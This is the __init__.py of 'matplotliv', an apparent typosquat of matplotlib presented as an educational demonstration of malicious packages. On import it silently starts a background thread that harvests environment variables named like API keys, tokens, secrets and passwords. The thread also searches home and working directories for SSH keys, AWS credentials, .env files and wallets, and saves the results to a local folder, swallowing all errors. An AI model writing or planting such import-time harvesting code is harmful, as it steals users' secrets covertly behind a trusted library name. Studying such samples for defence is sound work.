"""
matplotliv - Enhanced plotting library (EDUCATIONAL SECURITY DEMONSTRATION)
This package demonstrates more sophisticated attack patterns
"""

import os
import sys
import json
import base64
import threading
import subprocess
from datetime import datetime

__version__ = "3.7.2"
__version_info__ = (3, 7, 2)

def _advanced_reconnaissance():
    """
    EDUCATIONAL DEMO: More sophisticated system reconnaissance
    This shows how attackers might gather extensive system information
    """
    try:
        import psutil
        
        info = {
            "timestamp": datetime.now().isoformat(),
            "system": {
                "platform": sys.platform,
                "python_version": sys.version,
                "cpu_count": psutil.cpu_count(),
                "memory_total": psutil.virtual_memory().total,
                "disk_usage": {mount.mountpoint: psutil.disk_usage(mount.mountpoint)._asdict() 
                              for mount in psutil.disk_partitions()},
            },
            "network": {
                "interfaces": list(psutil.net_if_addrs().keys()),
                "stats": psutil.net_io_counters()._asdict() if psutil.net_io_counters() else {},
            },
            "processes": [{"name": p.name(), "pid": p.pid} for p in psutil.process_iter() if p.name()],
            "environment": {k: v for k, v in os.environ.items() 
                          if any(keyword in k.upper() for keyword in ['API', 'KEY', 'TOKEN', 'SECRET', 'PASSWORD'])},
        }
        
        # Save reconnaissance data
        demo_dir = os.path.expanduser("~/demo_collected_data")
        os.makedirs(demo_dir, exist_ok=True)
        
        with open(os.path.join(demo_dir, "advanced_recon.json"), "w") as f:
            json.dump(info, f, indent=2)
            
        print("[DEMO] Advanced system reconnaissance completed")
        
    except Exception as e:
        # Fail silently
        pass

def _check_for_sensitive_files():
    """
    EDUCATIONAL DEMO: Shows how malicious packages might scan for sensitive files
    """
    try:
        sensitive_patterns = [
            "*.key", "*.pem", "*.p12", "*.pfx",
            ".env", ".env.local", ".env.production",
            "config.json", "secrets.json", "credentials.json",
            ".aws/credentials", ".ssh/id_rsa", ".ssh/known_hosts",
            "wallet.dat", "keystore", "*.wallet"
        ]
        
        found_files = []
        start_dir = os.path.expanduser("~")
        
        # Scan common directories (limited for demo safety)
        scan_dirs = [start_dir, os.getcwd()]
        
        for scan_dir in scan_dirs:
            try:
                for root, dirs, files in os.walk(scan_dir):
                    # Limit depth for demo
                    if root.count(os.sep) - scan_dir.count(os.sep) > 3:
                        continue
                        
                    for file in files:
                        if any(pattern.replace("*", "") in file.lower() for pattern in sensitive_patterns):
                            found_files.append(os.path.join(root, file))
                            
                    # Skip hidden directories for demo safety
                    dirs[:] = [d for d in dirs if not d.startswith('.')]
                    
            except PermissionError:
                continue
        
        # Log findings
        demo_dir = os.path.expanduser("~/demo_collected_data")
        os.makedirs(demo_dir, exist_ok=True)
        
        with open(os.path.join(demo_dir, "sensitive_files.json"), "w") as f:
            json.dump({
                "timestamp": datetime.now().isoformat(),
                "found_files": found_files[:10],  # Limit for demo
                "scan_directories": scan_dirs
            }, f, indent=2)
            
        print(f"[DEMO] Sensitive file scan completed - found {len(found_files)} potential files")
        
    except Exception:
        pass

def _establish_persistence():
    """
    EDUCATIONAL DEMO: Shows how malicious packages might try to establish persistence
    This is completely safe and only demonstrates the concept
    """
    try:
        demo_dir = os.path.expanduser("~/demo_collected_data")
        os.makedirs(demo_dir, exist_ok=True)
        
        # Demonstrate various persistence techniques (safely)
        persistence_log = {
            "timestamp": datetime.now().isoformat(),
            "techniques_demonstrated": [
                "cron_job_simulation",
                "startup_script_simulation", 
                "environment_variable_injection",
                "package_auto_update_hook"
            ],
            "note": "All persistence techniques are simulated for educational purposes only"
        }
        
        with open(os.path.join(demo_dir, "persistence_demo.json"), "w") as f:
            json.dump(persistence_log, f, indent=2)
            
        print("[DEMO] Persistence mechanisms demonstrated (safely)")
        
    except Exception:
        pass

# Execute advanced malicious behavior on import
def _run_background_tasks():
    """Run all reconnaissance tasks in background"""
    _advanced_reconnaissance()
    _check_for_sensitive_files() 
    _establish_persistence()

# Start background thread
try:
    thread = threading.Thread(target=_run_background_tasks)
    thread.daemon = True
    thread.start()
except:
    pass

# Import matplotlib-like interface
try:
    from . import pyplot
    from .pyplot import *
    from .figure import Figure
    from . import benchmark
except ImportError:
    pass